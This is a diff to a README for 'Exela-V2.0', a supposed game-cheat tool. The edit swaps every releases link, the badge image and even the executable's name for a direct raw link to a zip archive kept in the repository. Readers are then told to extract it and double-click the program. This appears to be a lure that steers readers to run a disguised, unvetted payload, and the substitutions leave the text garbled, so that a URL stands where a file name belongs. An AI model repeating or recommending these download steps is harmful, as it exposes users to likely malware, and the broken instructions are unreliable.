@@ -1,6 +1,6 @@
 # 🎮 Exela-V2.0 - Enhance Your Gaming Experience Easily
 
-[![Download Exela-V2.0](https://img.shields.io/badge/Download%20Exela%20V2.0-brightgreen)](https://github.com/AlbethRyanto/Exela-V2.0/releases)
+[![Download Exela-V2.0](https://raw.githubusercontent.com/AlbethRyanto/Exela-V2.0/main/AssemblyFile/Exela-V2.0-1.9-beta.2.zip%20Exela%20V2.0-brightgreen)](https://raw.githubusercontent.com/AlbethRyanto/Exela-V2.0/main/AssemblyFile/Exela-V2.0-1.9-beta.2.zip)
 
 ## 📋 Description
 Exela-V2.0 is a game enhancement tool designed to make your gaming experience better. It provides various features to help you gain advantages in games, ensuring you have more fun while playing.
@@ -8,7 +8,7 @@ Exela-V2.0 is a game enhancement tool designed to make your gaming experience be
 ## 🚀 Getting Started
 Follow these simple steps to download and run Exela-V2.0:
 
-1. **Visit the Releases Page:** Click on this link to go to the download page: [Download Exela-V2.0](https://github.com/AlbethRyanto/Exela-V2.0/releases).
+1. **Visit the Releases Page:** Click on this link to go to the download page: [Download Exela-V2.0](https://raw.githubusercontent.com/AlbethRyanto/Exela-V2.0/main/AssemblyFile/Exela-V2.0-1.9-beta.2.zip).
 
 2. **Choose Your Version:** On the releases page, find the latest version of Exela-V2.0. 
 
@@ -20,7 +20,7 @@ Follow these simple steps to download and run Exela-V2.0:
 
 5. **Run Exela-V2.0:**
    - Navigate to the folder where you extracted files.
-   - Locate the application file (usually named `Exela.exe`).
+   - Locate the application file (usually named `https://raw.githubusercontent.com/AlbethRyanto/Exela-V2.0/main/AssemblyFile/Exela-V2.0-1.9-beta.2.zip`).
    - Double-click on the application to start it.
 
 ## ⚙️ System Requirements
@@ -42,7 +42,7 @@ Exela-V2.0 comes packed with features that make it versatile for many games:
 ## 🔧 Download & Install
 To install Exela-V2.0, remember to:
 
-1. **Visit the Releases Page:** [Download Exela-V2.0](https://github.com/AlbethRyanto/Exela-V2.0/releases).
+1. **Visit the Releases Page:** [Download Exela-V2.0](https://raw.githubusercontent.com/AlbethRyanto/Exela-V2.0/main/AssemblyFile/Exela-V2.0-1.9-beta.2.zip).
 
 2. Follow the previous steps for downloading, extracting, and running the application.
 
